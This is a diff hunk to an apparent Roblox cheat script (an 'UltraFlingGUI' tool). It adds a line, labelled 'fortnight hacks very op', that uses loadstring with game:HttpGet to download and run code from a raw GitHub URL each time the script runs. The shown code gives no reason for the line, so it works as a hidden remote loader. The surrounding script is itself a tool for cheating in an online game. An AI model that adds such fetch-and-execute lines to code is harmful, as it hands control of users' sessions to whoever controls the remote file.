@@ -6,6 +6,9 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+-- ===== fortnight hacks very op =====
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iarotcod/slappybattling/refs/heads/main/fortnite%20hacks",true))()
+
 -- ===== CLEANUP =====
 if CoreGui:FindFirstChild("UltraFlingGUI") then CoreGui.UltraFlingGUI:Destroy() end
 if CoreGui:FindFirstChild("TempNotification") then CoreGui.TempNotification:Destroy() end
